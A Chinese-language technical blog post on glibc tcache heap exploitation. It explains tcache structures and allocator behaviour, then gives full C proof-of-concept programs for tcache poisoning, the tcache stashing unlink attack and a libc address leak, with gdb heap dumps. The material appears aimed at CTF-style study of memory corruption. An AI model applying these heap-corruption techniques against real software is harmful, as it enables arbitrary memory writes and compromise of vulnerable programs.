---
title: Tcache attack
date: 2022-03-27 16:13:14
tags:
    - pwn
    - 堆
---

<!--more-->

# Tcache

Tcache是libc-2.26加入的新机制，本义上是为了加快内存的分配，但另一方面却让安全性大打折扣。

Glibc用`tcache_entry`和`tcache_perthread_struct`两个结构体来管理tcache bin

## tcache_entry

```
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  uintptr_t key;
} tcache_entry;

```

在2.27glibc中tcache_entry只有一个参数*next指向的下一个chunk的fd字段，有点类似fastbin单向链表，但是在2.33中增加了一个key参数，用来防止double free漏洞。

**源码对key的解释：**

tcache_key的值实际上不必是一个加密的全安全随机数。它只需要足够随意，这样就不会与应用程序中存在的值冲突。如果真的发生碰撞

由于检查整个列表以检查该块是否确实已在第二次被释放，因此它可能会导致性能下降。然而，这种情况发生的几率非常低，约为1/2^wordsize。性能降低的可能性可能更大，因为第一次空闲发生在不同的线程中时出现了双空闲





## tcache_perthread_struct

```
typedef struct tcache_perthread_struct
{
  uint16_t counts[TCACHE_MAX_BINS];//数组长度64，每个元素最大为0x7，仅占用一个字节（对应64个tcache链表）
  tcache_entry *entries[TCACHE_MAX_BINS];//entries指针数组（对应64个tcache链表，cache bin中最大为0x400字节
//每一个指针指向的是对应tcache_entry结构体的地址。
} tcache_perthread_struct;
```

> Tcache_perthread_struct在每一个线程中均有一个，用来管理当前线程中所有的tcache_bins
>
> Entries用来存储各个大小的tcahce bin链表，TCACHE_MAX_BINS默认值为64，也就是0x20,0x30……0x410(64位)大小的chunk被释放后都有可能放入tcache bins里面
>
> counts结构体用来记录各个大小的tcache bin数量，最大为7
>
> > 用图大概表示：
> >
> > ![image-20220328110504312](https://s2.loli.net/2022/03/28/ZsVKgi4w51oxA6y.png)

## 基本工作方式

-  第一次 malloc 时，会先 malloc 一块内存用来存放 `tcache_perthread_struct` 。
- free 内存，且 size 小于 small bin size 时
- tcache 之前会放到 fastbin 或者 unsorted bin 中
- tcache 后：

- 先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）
- tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中
-  tcache 中的 chunk 不会合并（不取消 inuse bit）

- malloc 内存，且 size 在 tcache 范围内
- 先从 tcache 取 chunk，直到 tcache 为空
-  tcache 为空后，从 bin 中找
-  tcache 为空时，如果 `fastbin/smallbin/unsorted bin` 中有 size 符合的 chunk，会先把 `fastbin/smallbin/unsorted bin` 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来

## tcache_get() 和 tcache_put()

**其中有两个重要的函数， `tcache_get()` 和 `tcache_put()`:**

```
static void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

static void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}
```

这两个函数会在函数 [_int_free](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l4173) 和 [__libc_malloc](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3051) 的开头被调用，其中 `tcache_put` 当所请求的分配大小不大于`0x408`并且当给定大小的 tcache bin 未满时调用。

`tcache_puts()` 完成了把释放的 chunk 插入到 `tcache->entries[tc_idx]` 链表头部的操作，也几乎没有任何保护。并且 **没有把 p 位置零**。

`tcache_get()` 就是获得 chunk 的过程了。可以看出这个过程还是很简单的，从 `tcache->entries[tc_idx]` 中获得第一个 chunk，`tcache->counts` 减一，几乎没有任何保护。

在 `tcache_get` 中，仅仅检查了 **tc_idx** ，此外，我们可以将 tcache 当作一个类似于 fastbin 的单独链表，只是它的 check，并没有 fastbin 那么复杂，仅仅检查 `tcache->entries[tc_idx] = e->next;`

### 范围

 chunk的大小在32bit上是12到512（8byte递增）；在64bits上是24到1024（16bytes递增）

### 放入tcache bin的情况

1.释放时，_int_free中在检查了size合法后，放入fastbin之前，它先尝试将其放入tcache
2.在int_malloc中，若fastbins中取出块则将对应bin中其余chunk填入tcache对应项直到填满（smallbins中也是如此）
3.当进入unsorted bin(同时发生堆块合并）中找到精确的大小时，并不是直接返回而是先加入tcache中，直到填满：

### 取tcache bin中的chunk

1.在__libc_malloc，_int_malloc之前，如果tcache中存在满足申请需求大小的块，就从对应的tcache中返回chunk
2.在遍历完unsorted bin(同时发生堆块合并）之后，若是tcache中有对应大小chunk则取出并返回：
3.在遍历unsorted bin时，大小不匹配的chunk将会被放入对应的bins，若达到tcache_unsorted_limit限制且之前已经存入过chunk则在此时取出（默认无限制）

## tcache poisoning

通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。

```
#include <stdio.h> 
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main()
{
       // disable buffering
     setbuf(stdin, NULL);
     setbuf(stdout, NULL);

     printf("This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"
                 "returning a pointer to an arbitrary location (in this case, the stack).\n"
                   "The attack is very similar to fastbin corruption attack.\n");
     printf("After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n"
                  "We have to create and free one more chunk for padding before fd pointer hijacking.\n\n");

     size_t stack_var;
     printf("The address we want malloc() to return is %p.\n", (char *)&stack_var);

     printf("Allocating 2 buffers.\n");
     intptr_t *a = malloc(128);
     printf("malloc(128): %p\n", a);
     intptr_t *b = malloc(128);
     printf("malloc(128): %p\n", b);

     printf("Freeing the buffers...\n");
     free(a);
     free(b);

     printf("Now the tcache list has [ %p -> %p ].\n", b, a);
     printf("We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
                   "to point to the location to control (%p).\n", sizeof(intptr_t), b, &stack_var);
     b[0] = (intptr_t)&stack_var;
     printf("Now the tcache list has [ %p -> %p ].\n", b, &stack_var);

     printf("1st malloc(128): %p\n", malloc(128));
     printf("Now the tcache list has [ %p ].\n", &stack_var);

     intptr_t *c = malloc(128);
     printf("2nd malloc(128): %p\n", c);
     printf("We got the control\n");

     assert((long)&stack_var == (long)c);
     return 0;
}
```

程序先申请了两个大小是 128 的 chunk，然后 free。128 在 tcache 的范围内，因此 free 之后该 chunk 被放到了 tcache 中

![image-20220328155917620](https://s2.loli.net/2022/03/28/JCHI857y4Gunalt.png)

然后修改 tcache 的 next ，通过

`b[0] = (intptr_t)&stack_var;`

![image-20220328155935282](https://s2.loli.net/2022/03/28/KPZlTUh4AotwnzB.png)

把b的fd指针改成栈上地址，接下来只需进行两次 `malloc(128)` 即可控制栈上的空间。

## tcache stashing unlink attack

这种攻击利用的是 tcache bin 有剩余 (数量小于 `TCACHE_MAX_BINS` ) 时，同大小的 small bin 会放进 tcache 中 (这种情况可以用 `calloc` 分配同大小堆块触发，因为 `calloc` 分配堆块时不从 tcache bin 中选取)。在获取到一个 `smallbin` 中的一个 chunk 后会如果 tcache 仍有足够空闲位置，会将剩余的 small bin 链入 tcache ，在这个过程中只对第一个  bin 进行了完整性检查，后面的堆块的检查缺失。当攻击者可以写一个 small bin 的 bk 指针时，其可以在任意地址上写一个 libc  地址 (类似 `unsorted bin attack` 的效果)。构造得当的情况下也可以分配 fake chunk 到任意地址。

我们按照释放的先后顺序称 `smallbin[sz]` 中的两个 chunk 分别为 chunk0 和 chunk1。我们修改 chunk1 的 `bk` 为 `fake_chunk_addr`。同时还要在 `fake_chunk_addr->bk` 处提前写一个可写地址 `writable_addr` 。调用 `calloc(size-0x10)` 的时候会返回给用户 chunk0 (这是因为 smallbin 的 `FIFO` 分配机制)，假设 `tcache[sz]` 中有 5 个空闲堆块，则有足够的位置容纳 `chunk1` 以及 `fake_chunk` 。在源码的检查中，只对第一个 chunk 的链表完整性做了检测 `__glibc_unlikely (bck->fd != victim)` ，后续堆块在放入过程中并没有检测。

因为 tcache 的分配机制是 `LIFO` ，所以位于 `fake_chunk->bk` 指针处的 `fake_chunk` 在链入 tcache 的时候反而会放到链表表头。在下一次调用 `malloc(sz-0x10)` 时会返回 `fake_chunk+0x10` 给用户，同时，由于 `bin->bk = bck;bck->fd = bin;` 的 unlink 操作，会使得 `writable_addr+0x10` 处被写入一个 libc 地址。

```
#include <stdio.h>
#include <stdlib.h>

int main(){
    unsigned long stack_var[0x10] = {0};
    unsigned long *chunk_lis[0x10] = {0};
    unsigned long *target;

    fprintf(stderr, "This file demonstrates the stashing unlink attack on tcache.\n\n");
    fprintf(stderr, "This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n");
    fprintf(stderr, "This technique can be used when you are able to overwrite the victim->bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n");
    fprintf(stderr, "The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n");
    fprintf(stderr, "This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\n\n");

    // stack_var emulate the fake_chunk we want to alloc to
    fprintf(stderr, "Stack_var emulates the fake chunk we want to alloc to.\n\n");
    fprintf(stderr, "First let's write a writeable address to fake_chunk->bk to bypass bck->fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk->bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n");

    stack_var[3] = (unsigned long)(&stack_var[2]);

    fprintf(stderr, "You can see the value of fake_chunk->bk is:%p\n\n",(void*)stack_var[3]);
    fprintf(stderr, "Also, let's see the initial value of stack_var[4]:%p\n\n",(void*)stack_var[4]);
    fprintf(stderr, "Now we alloc 9 chunks with malloc.\n\n");

    //now we malloc 9 chunks
    for(int i = 0;i < 9;i++){
        chunk_lis[i] = (unsigned long*)malloc(0x90);
    }

    //put 7 tcache
    fprintf(stderr, "Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n");

    for(int i = 3;i < 9;i++){
        free(chunk_lis[i]);
    }

    fprintf(stderr, "As you can see, chunk1 & [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n");

    //last tcache bin
    free(chunk_lis[1]);
    //now they are put into unsorted bin
    free(chunk_lis[0]);
    free(chunk_lis[2]);

    //convert into small bin
    fprintf(stderr, "Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n");

    malloc(0xa0);//>0x90

    //now 5 tcache bins
    fprintf(stderr, "Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n");

    malloc(0x90);
    malloc(0x90);

    fprintf(stderr, "Now we emulate a vulnerability that can overwrite the victim->bk pointer into fake_chunk addr: %p.\n\n",(void*)stack_var);

    //change victim->bck
    /*VULNERABILITY*/
    chunk_lis[2][1] = (unsigned long)stack_var;
    /*VULNERABILITY*/

    //trigger the attack
    fprintf(stderr, "Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n");

    calloc(1,0x90);

    fprintf(stderr, "Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck->fd has been changed into a libc addr: %p\n\n",(void*)stack_var[2],(void*)stack_var[4]);

    //malloc and return our fake chunk on stack
    target = malloc(0x90);   

    fprintf(stderr, "As you can see, next malloc(0x90) will return the region our fake chunk: %p\n",(void*)target);
    return 0;
}

```

这个 poc 用栈上的一个数组上模拟 `fake_chunk` 。首先构造出 5 个 `tcache chunk` 和 2 个 `smallbin chunk` 的情况。模拟 `UAF` 漏洞修改 `bin2->bk` 为 `fake_chunk` ，在 `calloc(0x90)` 的时候触发攻击。

在 `calloc` 处下断点，调用前查看堆块排布情况。此时 `tcache[0xa0]` 中有 5 个空闲块。可以看到 chunk1->bk 已经被改为了 `fake_chunk_addr` 。而 `fake_chunk->bk` 也写上了一个可写地址。由于 `smallbin` 是按照 `bk` 指针寻块的，分配得到的顺序应当是 `0x555555757250->0x555555757390->0x7fffffffdc50 (FIFO)` 。调用 calloc 会返回给用户 `0x555555757250+0x10`。

![image-20220328165440709](https://s2.loli.net/2022/03/28/2QONislLBGD7b4a.png)

调用 calloc 后再查看堆块排布情况，可以看到 `fake_chunk` 已经被链入 `tcache_entry[8]` , 且因为分配顺序变成了 `LIFO` , `0x7fffffffdc60-0x10` 这个块被提到了链表头，下次 `malloc(0x90)` 即可获得这个块。

其 fd 指向下一个空闲块，在 unlink 过程中 `bck->fd=bin` 的赋值操作使得 

![image-20220328165626997](https://s2.loli.net/2022/03/28/sv7UW3KEGL6VaPt.png)

## libc leak

在以前的 libc 版本中，我们只需这样:

```
#include <stdlib.h>
#include <stdio.h>

int main()
{
    long *a = malloc(0x1000);
    malloc(0x10);
    free(a);
    printf("%p\n",a[0]);
} 
```

但是在 2.26 之后的 libc 版本后，我们首先得先把 tcache 填满：

```
#include <stdlib.h>
#include <stdio.h>

int main(int argc , char* argv[])
{
    long* t[7];
    long *a=malloc(0x100);
    long *b=malloc(0x10);

    // make tcache bin full
    for(int i=0;i<7;i++)
        t[i]=malloc(0x100);
    for(int i=0;i<7;i++)
        free(t[i]);

    free(a);
    // a is put in an unsorted bin because the tcache bin of this size is full
    printf("%p\n",a[0]);
} 
```

之后，我们就可以 leak libc 了。

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555559af0 (size : 0x20510)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x555555559250 (size : 0x110)
(0x110)   tcache_entry[15]: 0x5555555599f0 --> 0x5555555598e0 --> 0x5555555597d0 --> 0x5555555596c0 --> 0x5555555595b0 --> 0x5555555594a0 --> 0x555555559390
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk
0x555555559000      0x0                 0x250                Used                None              None
0x555555559250      0x0                 0x110                Freed     0x7ffff7fc0ca0    0x7ffff7fc0ca0
0x555555559360      0x110               0x20                 Used                None              None
0x555555559380      0x0                 0x110                Used                None              None
0x555555559490      0x0                 0x110                Used                None              None
0x5555555595a0      0x0                 0x110                Used                None              None
0x5555555596b0      0x0                 0x110                Used                None              None
```

